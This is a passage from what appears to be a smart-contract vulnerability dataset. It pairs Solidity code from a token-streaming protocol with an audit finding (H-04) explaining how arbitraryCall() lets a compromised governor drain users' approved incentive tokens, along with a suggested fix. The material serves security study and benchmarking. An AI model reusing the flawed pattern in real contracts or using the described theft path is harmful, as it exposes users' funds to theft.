feeEnabled;\n    }\n\n    // ======= Storage ========\n    GovernableStreamParams public streamParams;\n    GovernableFeeParams public feeParams;\n    uint64 public currStreamId; \n\n    uint16 constant MAX_FEE_PERCENT = 500; // 500/10000 == 5%\n\n    // =======  Events  =======\n    event StreamCreated(uint256 indexed stream_id, address stream_addr);\n    event StreamParametersUpdated(GovernableStreamParams oldParams, GovernableStreamParams newParams);\n    event FeeParametersUpdated(GovernableFeeParams oldParams, GovernableFeeParams newParams);\n\n    constructor(address _governor, address _emergency_governor) public Governed(_governor, _emergency_governor) {\n        streamParams = GovernableStreamParams({\n            maxDepositLockDuration: 52 weeks,\n            maxRewardLockDuration: 52 weeks,\n            maxStreamDuration: 2 weeks,\n            minStreamDuration: 1 hours\n        });\n    }\n\n    /**\n     * @dev Deploys a minimal contract pointing to streaming logic. This contract will also be the token contract\n     * for the receipt token. It custodies the depositTokens until depositLockDuration is complete. After\n     * lockDuration is completed, the depositTokens can be claimed by the original depositors\n     * \n    **/\n    function createStream(\n        address rewardToken,\n        address depositToken,\n        uint32 startTime,\n        uint32 streamDuration,\n        uint32 depositLockDuration,\n        uint32 rewardLockDuration,\n        bool isSale\n    )\n        public\n        returns (Stream)\n    {\n        // perform checks\n\n        {\n            require(startTime >= block.timestamp, \"past\");\n            require(streamDuration >= streamParams.minStreamDuration && streamDuration <= streamParams.maxStreamDuration, \"stream\");\n            require(depositLockDuration <= streamParams.maxDepositLockDuration, \"lock\");\n            require(rewardLockDuration <= streamParams.maxRewardLockDuration, \"reward\");\n        }\n        \n\n        // TODO: figure out sane salt, i.e. streamid + x? streamid guaranteed to be unique\n        uint64 that_stream = currStreamId;\n        currStreamId += 1;\n        bytes32 salt = bytes32(uint256(that_stream));\n\n        Stream stream = new Stream{salt: salt}(\n            that_stream,\n            msg.sender,\n            isSale,\n            rewardToken,\n            depositToken,\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration,\n            feeParams.feePercent,\n            feeParams.feeEnabled\n        );\n\n        emit StreamCreated(that_stream, address(stream));\n\n        return stream;\n    }\n\n    function updateStreamParams(GovernableStreamParams memory newParams) public governed {\n        // DATA VALIDATION:\n        //  there is no real concept of \"sane\" limits here, and if misconfigured its ultimated\n        //  not a massive deal so no data validation is done\n        GovernableStreamParams memory old = streamParams;\n        streamParams = newParams;\n        emit StreamParametersUpdated(old, newParams);\n    }\n\n    function updateFeeParams(GovernableFeeParams memory newFeeParams) public governed {\n        require(newFeeParams.feePercent <= MAX_FEE_PERCENT, \"fee\");\n        GovernableFeeParams memory old = feeParams;\n        feeParams = newFeeParams;\n        emit FeeParametersUpdated(old, newFeeParams);\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity 0.8.10;\n\nimport {DSTestPlus} from \"./utils/DSTestPlus.sol\";\nimport {DSInvariantTest} from \"./utils/DSInvariantTest.sol\";\n\nimport {MockERC20} from \"./utils/mocks/MockERC20.sol\";\nimport {ERC20User} from \"./utils/users/ERC20User.sol\";\n\ncontract ERC20Test is DSTestPlus {\n    MockERC20 token;\n\n    function setUp() public {\n        token = new MockERC20(\"Token\", \"TKN\", 18);\n    }\n\n    function invariantMetadata() public {\n        assertEq(token.name(), \"Token\");\n        assertEq(token.symbol(), \"TKN\");\n        assertEq(token.decimals(), 18);\n    }\n\n    function testMetaData(\n        string calldata name,\n        string calldata symbol,\n        uint8 decimals\n    ) public {\n        MockERC20 tkn = new MockERC20(name, symbol, decimals);\n        assertEq(tkn.name(), name);\n        assertEq(tkn.symbol(), symbol);\n        assertEq(tkn.decimals(), decimals);\n    }\n\n    function testMint(address from, uint256 amount) public {\n        token.mint(from, amount);\n\n        assertEq(token.totalSupply(), amount);\n        assertEq(token.balanceOf(from), amount);\n    }\n\n    function testBurn(\n        address from,\n        uint256 mintAmount,\n        uint256 burnAmount\n    ) public {\n        if (burnAmount > mintAmount) return;\n\n        token.mint(from, mintAmount);\n        token.burn(from, burnAmount);\n\n        assertEq(token.totalSupply(), mintAmount - burnAmount);\n        assertEq(token.balanceOf(from), mintAmount - burnAmount);\n    }\n\n    function testApprove(address from, uint256 amount) public {\n        assertTrue(token.approve(from, amount));\n\n        assertEq(token.allowance(address(this), from), amount);\n    }\n\n    function testTransfer(address from, uint256 amount) public {\n        token.mint(address(this), amount);\n\n        assertTrue(token.transfer(from, amount));\n        assertEq(token.totalSupply(), amount);\n\n        if (address(this) == from) {\n            assertEq(token.balanceOf(address(this)), amount);\n        } else {\n            assertEq(token.balanceOf(address(this)), 0);\n            assertEq(token.balanceOf(from), amount);\n        }\n    }\n\n    function testTransferFrom(\n        address to,\n        uint256 approval,\n        uint256 amount\n    ) public {\n        if (amount > approval) return;\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), amount);\n\n        from.approve(address(this), approval);\n\n        assertTrue(token.transferFrom(address(from), to, amount));\n        assertEq(token.totalSupply(), amount);\n\n        uint256 app = address(from) == address(this) || approval == type(uint256).max ? approval : approval - amount;\n        assertEq(token.allowance(address(from), address(this)), app);\n\n        if (address(from) == to) {\n            assertEq(token.balanceOf(address(from)), amount);\n        } else {\n            assertEq(token.balanceOf(address(from)), 0);\n            assertEq(token.balanceOf(to), amount);\n        }\n    }\n\n    function testFailTransferFromInsufficientAllowance(\n        address to,\n        uint256 approval,\n        uint256 amount\n    ) public {\n        require(approval < amount);\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), amount);\n        from.approve(address(this), approval);\n        token.transferFrom(address(from), to, amount);\n    }\n\n    function testFailTransferFromInsufficientBalance(\n        address to,\n        uint256 mintAmount,\n        uint256 sendAmount\n    ) public {\n        require(mintAmount < sendAmount);\n\n        ERC20User from = new ERC20User(token);\n\n        token.mint(address(from), mintAmount);\n        from.approve(address(this), sendAmount);\n        token.transferFrom(address(from), to, sendAmount);\n    }\n}\n\ncontract ERC20Invariants is DSTestPlus, DSInvariantTest {\n    BalanceSum balanceSum;\n    MockERC20 token;\n\n    function setUp() public {\n        token = new MockERC20(\"Token\", \"TKN\", 18);\n        balanceSum = new BalanceSum(token);\n\n        addTargetContract(address(balanceSum));\n    }\n\n    function invariantBalanceSum() public {\n        assertEq(token.totalSupply(), balanceSum.sum());\n    }\n}\n\ncontract BalanceSum {\n    MockERC20 token;\n    uint256 public sum;\n\n    constructor(MockERC20 _token) {\n        token = _token;\n    }\n\n    function mint(address from, uint256 amount) public {\n        token.mint(from, amount);\n        sum += amount;\n    }\n\n    function burn(address from, uint256 amount) public {\n        token.burn(from, amount);\n        sum -= amount;\n    }\n\n    function approve(address to, uint256 amount) public {\n        token.approve(to, amount);\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public {\n        token.transferFrom(from, to, amount);\n    }\n\n    function transfer(address to, uint256 amount) public {\n        token.transfer(to, amount);\n    }\n}\n\n\n// SPDX-License-Identifier: AGPL-3.0-only\npragma solidity >=0.8.0;\n\nimport \"solmate/tokens/ERC20.sol\";\n\n/// @notice Modern and gas efficient ERC20 + EIP-2612 implementation.\n/// @author Modified from Uniswap (https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/UniswapV2ERC20.sol)\nabstract contract LockeERC20 {\n    /*///////////////////////////////////////////////////////////////\n                                  EVENTS\n    //////////////////////////////////////////////////////////////*/\n\n    event Transfer(address indexed from, address indexed to, uint256 amount);\n\n    event Approval(address indexed owner, address indexed spender, uint256 amount);\n\n    /*///////////////////////////////////////////////////////////////\n                             METADATA STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    string public name;\n\n    string public symbol;\n\n    uint8 public immutable decimals;\n\n    uint32 public immutable transferStartTime;\n\n    /*///////////////////////////////////////////////////////////////\n                              ERC20 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    uint256 public totalSupply;\n\n    mapping(address => uint256) public balanceOf;\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    /*///////////////////////////////////////////////////////////////\n                           EIP-2612 STORAGE\n    //////////////////////////////////////////////////////////////*/\n\n    bytes32 public constant PERMIT_TYPEHASH =\n        keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n    uint256 internal immutable INITIAL_CHAIN_ID;\n\n    bytes32 internal immutable INITIAL_DOMAIN_SEPARATOR;\n\n    mapping(address => uint256) public nonces;\n\n    /*///////////////////////////////////////////////////////////////\n                               CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    constructor(\n        address depositToken,\n        uint256 streamId,\n        uint32 endStream\n    ) {\n\n        // locke + depositTokenName + streamId = lockeUSD Coin-1\n        name = string(abi.encodePacked(\"locke\", ERC20(depositToken).name(), \": \", toString(streamId)));\n        // locke + Symbol + streamId = lockeUSDC1\n        // TODO: we could have start_time+stream_duration+depositlocktime as maturity-date\n        // i.e. lockeETH8-AUG-14-2022\n        symbol = string(abi.encodePacked(\"locke\", ERC20(depositToken).symbol(), toString(streamId)));\n        decimals = 18;\n\n        transferStartTime = endStream;\n\n        INITIAL_CHAIN_ID = block.chainid;\n        INITIAL_DOMAIN_SEPARATOR = computeDomainSeparator();\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                              ERC20 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    modifier transferabilityDelay {\n        // ensure the time is after start time\n        require(block.timestamp >= transferStartTime, \"stream\");\n        _;\n    }\n\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\n        allowance[msg.sender][spender] = amount;\n\n        emit Approval(msg.sender, spender, amount);\n\n        return true;\n    }\n\n    function transfer(address to, uint256 amount) transferabilityDelay public virtual returns (bool) {\n        balanceOf[msg.sender] -= amount;\n\n        // This is safe because the sum of all user\n        // balances can't exceed type(uint256).max!\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(msg.sender, to, amount);\n\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) transferabilityDelay public virtual returns (bool) {\n        if (allowance[from][msg.sender] != type(uint256).max) {\n            allowance[from][msg.sender] -= amount;\n        }\n\n        balanceOf[from] -= amount;\n\n        // This is safe because the sum of all user\n        // balances can't exceed type(uint256).max!\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(from, to, amount);\n\n        return true;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                              EIP-2612 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) public virtual {\n        require(deadline >= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\");\n\n        // This is safe because the only math done is incrementing\n        // the owner's nonce which cannot realistically overflow.\n        unchecked {\n            bytes32 digest = keccak256(\n                abi.encodePacked(\n                    \"\\x19\\x01\",\n                    DOMAIN_SEPARATOR(),\n                    keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline))\n                )\n            );\n\n            address recoveredAddress = ecrecover(digest, v, r, s);\n            require(recoveredAddress != address(0) && recoveredAddress == owner, \"INVALID_PERMIT_SIGNATURE\");\n\n            allowance[recoveredAddress][spender] = value;\n        }\n\n        emit Approval(owner, spender, value);\n    }\n\n    function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\n        return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();\n    }\n\n    function computeDomainSeparator() internal view virtual returns (bytes32) {\n        return\n            keccak256(\n                abi.encode(\n                    keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"),\n                    keccak256(bytes(name)),\n                    keccak256(bytes(\"1\")),\n                    block.chainid,\n                    address(this)\n                )\n            );\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                       INTERNAL MINT/BURN LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function _mint(address to, uint256 amount) internal virtual {\n        totalSupply += amount;\n\n        // This is safe because the sum of all user\n        // balances can't exceed type(uint256).max!\n        unchecked {\n            balanceOf[to] += amount;\n        }\n\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal virtual {\n        balanceOf[from] -= amount;\n\n        // This is safe because a user won't ever\n        // have a balance larger than totalSupply!\n        unchecked {\n            totalSupply -= amount;\n        }\n\n        emit Transfer(from, address(0), amount);\n    }\n\n\n    // Helpers\n    function toString(uint _i)\n        internal\n        pure\n        returns (string memory) \n    {\n        if (_i == 0) {\n            return \"0\";\n        }\n        uint j = _i;\n        uint len;\n        while (j != 0) {\n            len++;\n            j /= 10;\n        }\n        bytes memory bstr = new bytes(len);\n        uint k = len;\n        while (_i != 0) {\n            k = k-1;\n            uint8 temp = (48 + uint8(_i - _i / 10 * 10));\n            bytes1 b1 = bytes1(temp);\n            bstr[k] = b1;\n            _i /= 10;\n        }\n        return string(bstr);\n    }\n}\n\n\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\ninterface Hevm {\n    // Set block.timestamp (newTimestamp)\n    function warp(uint256) external;\n    // Set block.height (newHeight)\n    function roll(uint256) external;\n    // Loads a storage slot from an address (who, slot)\n    function load(address,bytes32) external returns (bytes32);\n    // Stores a value to an address' storage slot, (who, slot, value)\n    function store(address,bytes32,bytes32) external;\n    // Signs data, (privateKey, digest) => (r, v, s)\n    function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n    // Gets address for a given private key, (privateKey) => (address)\n    function addr(uint256) external returns (address);\n    // Performs a foreign function call via terminal, (stringInputs) => (result)\n    function ffi(string[] calldata) external returns (bytes memory);\n    // Calls another contract with a specified `msg.sender`, (newSender, contract, input) => (success, returnData)\n    function prank(address, address, bytes calldata) external payable returns (bool, bytes memory);\n    // Sets an address' balance, (who, newBalance)\n    function deal(address, uint256) external;\n    // Sets an address' code, (who, newCode)\n    function etch(address, bytes calldata) external;\n}\n\n\n\n",
        "CodeNames": [
            "Locke.sol",
            "ERC20.t.sol",
            "LockeERC20.sol",
            "Hevm.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-04",
                "Location": [
                    "//solidity\nfunction arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n    // cannot have an active incentive for the callee\n    require(incentives[who] == 0, \"inc\");\n    ...\n"
                ],
                "Type": " Improper implementation of  arbitraryCall()  allows protocol gov to steal funds from users' wallets",
                "Description": "\n<https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L733-L735\n\nsolidity\nfunction arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n    // cannot have an active incentive for the callee\n    require(incentives[who] == 0, \"inc\");\n    ...\n\n\nWhen an incentiveToken is claimed after endStream, incentives[who] will be 0 for that incentiveToken.\n\nIf the protocol gov is malicious or compromised, they can call arbitraryCall() with the address of the incentiveToken as who and transferFrom() as calldata and steal all the incentiveToken in the victim's wallet balance up to the allowance amount.\n\n\n1.  Alice approved USDC to the streaming contract;\n2.  Alice called createIncentive() and added 1,000 USDC of incentive;\n3.  After the stream is done, the stream creator called claimIncentive() and claimed 1,000 USDC;\n\nThe compromised protocol gov can call arbitraryCall() and steal all the USDC in Alice's wallet balance.\n\n",
                "Repair": "\nConsider adding a mapping: isIncentiveToken, setting isIncentiveToken[incentiveToken] = true in createIncentive(), and require(!isIncentiveToken[who], ...) in arbitraryCall().\n\nbrockelmore (Streaming Protocol) confirmed(https://github.com/code-423n4/2021-11-streaming-findings/issues/258#issuecomment-989281413)\n\n\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.0;\n\nimport \"./LockeERC20.sol\";\nimport \"solmate/utils/SafeTransferLib.sol\";\nimport \"solmate/tokens/ERC20.sol\";\n\n// ====== Governance =====\ncontract Governed {\n    address public gov;\n    address private pendingGov;\n    address public emergency_gov;\n\n    event NewGov(address indexed oldGov, address indexed newGov);\n    event NewPendingGov(address indexed oldPendingGov, address indexed newPendingGov);\n\n    constructor(address _governor, address _emergency_governor) public {\n        gov = _governor;\n        emergency_gov = _emergency_governor;\n    }\n\n    function governorship() public view returns (address, address, address) {\n        return (gov, emergency_gov, pendingGov);\n    }\n\n    /// Update pending governor\n    function setPendingGov(address newPendingGov) governed public {\n        address old = pendingGov;\n        pendingGov = newPendingGov;\n        emit NewPendingGov(old, newPendingGov);\n    }\n\n    /// Accepts governorship\n    function acceptGov() public {\n        require(pendingGov == msg.sender, \"!pending\");\n        address old = gov;\n        gov = pendingGov;\n        emit NewGov(old, pendingGov);\n    }\n\n    function setEmergencyGov(address who) public governed {\n        emergency_gov = who;\n    } \n\n    /// Remove governor\n    function __abdicate() governed public {\n        address old = gov;\n        gov = address(0);\n        emit NewGov(old, address(0));\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier governed {\n        require(msg.sender == gov, \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier emergency_governed {\n        require(msg.sender == gov || msg.sender == emergency_gov, \"!egov\");\n        _;\n    }\n}\n\ninterface IGoverned {\n    function gov() external view returns (address);\n    function emergency_gov() external view returns (address);\n}\n\nabstract contract ExternallyGoverned {\n    IGoverned public gov;\n\n    constructor(address governor) {\n        gov = IGoverned(governor);\n    }\n\n    // ====== Modifiers =======\n    /// Governed function\n    modifier externallyGoverned {\n        require(msg.sender == gov.gov(), \"!gov\");\n        _;\n    }\n\n    /// Emergency governed function\n    modifier externallyEmergencyGoverned {\n        require(msg.sender == gov.gov() || msg.sender == gov.emergency_gov(), \"!e_gov\");\n        _;\n    }\n}\n\ninterface LockeCallee {\n    function lockeCall(address initiator, address token, uint256 amount, bytes calldata data) external;\n}\n\n// ====== Stream =====\ncontract Stream is LockeERC20, ExternallyGoverned {\n    using SafeTransferLib for ERC20;    \n    // ======= Structs ========\n    struct TokenStream {\n        uint256 lastCumulativeRewardPerToken;\n        uint256 virtualBalance;\n        uint112 rewards;\n        uint112 tokens;\n        uint32 lastUpdate;\n        bool merkleAccess;\n    }\n\n    // ======= Storage ========\n    // ==== Immutables =====\n    // stream start time\n    uint32 private immutable startTime;\n    // length of stream\n    uint32 private immutable streamDuration;\n    // length of time depositTokens are locked after stream ends\n    uint32 private immutable depositLockDuration;\n    // length of time rewardTokens are locked after stream ends\n    uint32 private immutable rewardLockDuration;\n\n    // end of stream\n    uint32 private immutable endStream;\n    // end of deposit lock\n    uint32 private immutable endDepositLock;\n    // end of reward lock\n    uint32 private immutable endRewardLock;\n\n    // Token given to depositer\n    address public immutable rewardToken;\n    // Token deposited\n    address public immutable depositToken;\n\n    // This stream's id\n    uint64 public immutable streamId;\n\n    // fee percent on reward tokens\n    uint16 private immutable feePercent;\n    // are fees enabled\n    bool private immutable feeEnabled;\n\n    // deposits are basically a *sale* to the stream creator if true\n    bool public immutable isSale;\n\n    // stream creator\n    address public immutable streamCreator;\n\n    uint112 private immutable depositDecimalsOne;\n    // ============\n\n    //  == sloc a ==\n    // internal reward token amount to be given to depositors\n    uint112 private rewardTokenAmount;\n    // internal deposit token amount locked/to be sold to stream creator\n    uint112 private depositTokenAmount;\n    // ============\n\n    // == slot b ==\n    uint112 private rewardTokenFeeAmount;\n    uint112 private depositTokenFlashloanFeeAmount;\n    uint8 private unlocked = 1;\n    bool private claimedDepositTokens;\n    // ============\n\n    // == slot c ==\n    uint256 private cumulativeRewardPerToken;\n    // ============\n\n    // == slot d ==\n    uint256 private totalVirtualBalance;\n    // ============\n\n    // == slot e ==\n    uint112 public unstreamed;\n    uint112 private redeemedDepositTokens;\n    uint32 private lastUpdate;\n    // ============\n\n    // mapping of address to number of tokens not yet streamed over\n    mapping (address => TokenStream) public tokensNotYetStreamed;\n\n    // external incentives to stream creator\n    mapping (address => uint112) public incentives;\n\n    // ======= Events ========\n    event StreamFunded(uint256 amount);\n    event Staked(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n    event StreamIncentivized(address indexed token, uint256 amount);\n    event StreamIncentiveClaimed(address indexed token, uint256 amount);\n    event SoldTokensClaimed(address indexed who, uint256 amount);\n    event DepositTokensReclaimed(address indexed who, uint256 amount);\n    event FeesClaimed(address indexed token, address indexed who, uint256 amount);\n    event RecoveredTokens(address indexed token, address indexed recipient, uint256 amount);\n    event RewardsClaimed(address indexed who, uint256 amount);\n    event Flashloaned(address indexed token, address indexed who, uint256 amount, uint256 fee);\n\n    // ======= Modifiers ========\n    modifier updateStream(address who) {\n        // save bytecode space by making it a jump instead of inlining at cost of gas\n        updateStreamInternal(who);\n        _;\n    }\n\n    function updateStreamInternal(address who) internal {\n        require(block.timestamp < endStream , \"!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        if (block.timestamp >= startTime) {\n            // set lastUpdates if need be\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = uint32(block.timestamp);\n            }\n\n            // accumulate reward per token info\n            cumulativeRewardPerToken = rewardPerToken();\n\n            // update user rewards\n            ts.rewards = earned(ts, cumulativeRewardPerToken);\n            // update users last cumulative reward per token\n            ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n            // update users unstreamed balance\n            uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;\n            if (acctTimeDelta > 0 && ts.tokens > 0) {\n                // some time has passed since this user last interacted\n                // update ts not yet streamed\n                ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n\n            // handle global unstreamed\n            uint32 tdelta = uint32(block.timestamp - lastUpdate);\n            // stream tokens over\n            if (tdelta > 0 && unstreamed > 0) {\n                uint256 globalStreamingSpeedPerSecond = (uint256(unstreamed) * 10**6)/ (endStream - lastUpdate);\n                unstreamed -= uint112((uint256(tdelta) * globalStreamingSpeedPerSecond) / 10**6);\n            }\n            // already ensure that blocktimestamp is less than endStream so guaranteed ok here\n            lastUpdate = uint32(block.timestamp);\n        } else {\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = startTime;\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = startTime;\n            }\n        }\n    }\n\n\n    function lockInternal() internal {\n        require(unlocked == 1, \"re\");\n        unlocked = 2;\n    }\n    modifier lock {\n        lockInternal();\n        _;\n        unlocked = 1;\n    }\n\n    constructor(\n        uint64 _streamId,\n        address creator,\n        bool _isSale,\n        address _rewardToken,\n        address _depositToken,\n        uint32 _startTime,\n        uint32 _streamDuration,\n        uint32 _depositLockDuration,\n        uint32 _rewardLockDuration,\n        uint16 _feePercent,\n        bool _feeEnabled\n\n    )\n        LockeERC20(_depositToken, _streamId, _startTime + _streamDuration)\n        ExternallyGoverned(msg.sender) // inherit factory governance\n        public \n    {\n        // set fee info\n        feePercent = _feePercent;\n        feeEnabled = _feeEnabled;\n\n        // limit feePercent\n        require(feePercent < 10000, \"fee\");\n    \n        // store streamParams\n        startTime = _startTime;\n        streamDuration = _streamDuration;\n        depositLockDuration = _depositLockDuration;\n        rewardLockDuration = _rewardLockDuration;\n\n        endStream = startTime + streamDuration;\n        endDepositLock = endStream + depositLockDuration;\n        endRewardLock = endStream + rewardLockDuration;\n    \n        // set tokens\n        depositToken = _depositToken;\n        rewardToken = _rewardToken;\n\n        // set streamId\n        streamId = _streamId;\n\n        // set sale info\n        isSale = _isSale;\n    \n        streamCreator = creator;\n\n        depositDecimalsOne = uint112(10**ERC20(depositToken).decimals());\n    }\n\n    /**\n     * @dev Returns relevant internal token amounts\n    **/\n    function tokenAmounts() public view returns (uint112, uint112, uint112, uint112) {\n        return (rewardTokenAmount, depositTokenAmount, rewardTokenFeeAmount, depositTokenFlashloanFeeAmount);\n    }\n\n    /**\n     * @dev Returns fee parameters\n    **/\n    function feeParams() public view returns (uint16, bool) {\n        return (feePercent, feeEnabled);\n    }\n\n    /**\n     * @dev Returns stream parameters\n    **/\n    function streamParams() public view returns (uint32,uint32,uint32,uint32) {\n        return (\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration\n        );\n    }\n\n    function lastApplicableTime() internal view returns (uint32) {\n        return block.timestamp <= endStream ? uint32(block.timestamp) : endStream;\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalVirtualBalance == 0) {\n            return cumulativeRewardPerToken;\n        } else {\n            // \u2206time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance\n            return cumulativeRewardPerToken + (\n                ((uint256(lastApplicableTime()) - lastUpdate) * rewardTokenAmount * depositDecimalsOne/streamDuration) \n                / totalVirtualBalance\n            );\n        }\n    }\n\n    function dilutedBalance(uint112 amount) internal view returns (uint256) {\n        // duration / timeRemaining * amount\n        if (block.timestamp < startTime) {\n            return amount;\n        } else {\n            uint32 timeRemaining = endStream - uint32(block.timestamp);\n            return ((uint256(streamDuration) * amount * 10**6) / timeRemaining) / 10**6;\n        }\n    }\n\n    function getEarned(address who) public view returns (uint256) {\n        TokenStream storage ts = tokensNotYetStreamed[who];\n        return earned(ts, rewardPerToken());\n    }\n\n    function earned(TokenStream storage ts, uint256 currCumRewardPerToken) internal view returns (uint112) {\n        return uint112(ts.virtualBalance * (currCumRewardPerToken - ts.lastCumulativeRewardPerToken) / depositDecimalsOne) + ts.rewards;\n    }\n\n    /**\n     * @dev Allows _anyone_ to fund this stream, if its before the stream start time\n    **/\n    function fundStream(uint112 amount) public lock {\n        require(amount > 0, \"amt\");\n        require(block.timestamp < startTime, \"time\");\n        uint112 amt;\n\n        // transfer from sender\n        uint256 prevBal = ERC20(rewardToken).balanceOf(address(this));\n        ERC20(rewardToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(rewardToken).balanceOf(address(this));\n        require(newBal < type(uint112).max && newBal > prevBal, \"erc\");\n\n        amount = uint112(newBal - prevBal);\n        // if fee is enabled, take a fee\n        if (feeEnabled) {\n            // Safety:\n            //  1. feePercent & y are casted up to u256, so cannot overflow when multiplying\n            //  2. downcast is safe because (x*y)/MAX_X is guaranteed to be smaller than y which is uint112\n            //  3. amount is guaranteed to be greater than feeAmt\n            uint112 feeAmt;\n            unchecked {\n                feeAmt = uint112(uint256(feePercent) * uint256(amount) / 10000); \n                amt = amount - feeAmt;\n            }\n\n            // since this operation can be repeated, we cannot assume no overflow so use checked math\n            rewardTokenFeeAmount += feeAmt;\n            rewardTokenAmount += amt;\n        } else {\n            amt = amount;\n            rewardTokenAmount += amt;\n        }\n        \n        emit StreamFunded(amt);\n    }\n\n    /**\n     *  @dev Deposits depositTokens into this stream\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function stake(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // require(block.timestamp < endStream, \"stake:!stream\");\n\n        // transfer tokens over\n        uint256 prevBal = ERC20(depositToken).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(depositToken).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n        \n        uint112 trueDepositAmt = uint112(newBal - prevBal);\n\n        depositTokenAmount += trueDepositAmt;\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        ts.tokens += trueDepositAmt;\n\n        uint256 virtualBal = dilutedBalance(trueDepositAmt);\n        ts.virtualBalance += virtualBal;\n        totalVirtualBalance += virtualBal;\n        unstreamed += trueDepositAmt;\n\n        if (!isSale) {\n            // not a straight sale, so give the user some receipt tokens\n            _mint(msg.sender, trueDepositAmt);\n        } else {\n        }\n\n        emit Staked(msg.sender, trueDepositAmt);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to withdraw a specific amount of depositTokens during a stream,\n     *  up to their tokensNotYetStreamed amount\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function withdraw(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        require(ts.tokens >= amount, \"amt\");\n        ts.tokens -= amount;\n\n        uint256 virtualBal = dilutedBalance(amount);\n        ts.virtualBalance -= virtualBal;\n        totalVirtualBalance -= virtualBal;\n        depositTokenAmount -= amount;\n        if (!isSale) {\n            _burn(msg.sender, amount);\n        } else {\n        }\n\n        // do the transfer\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit Withdrawn(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to exit their entire remaining tokens that haven't streamed\n     *  and burns receiptTokens if its not a sale.\n     * \n     *  additionally, updates tokensNotYetStreamed. Lock is done in withdraw\n    */ \n    function exit() public updateStream(msg.sender) {\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        uint112 amount = ts.tokens;\n        withdraw(amount);\n    }\n\n    /**\n     *  @dev Allows anyone to incentivize this stream with extra tokens\n     *  and requires the incentive to not be the reward or deposit token\n    */ \n    function createIncentive(address token, uint112 amount) public lock {\n        require(token != rewardToken && token != depositToken, \"inc\");\n        \n        uint256 prevBal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(token).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n\n        uint112 amt = uint112(newBal - prevBal);\n        incentives[token] += amt;\n        emit 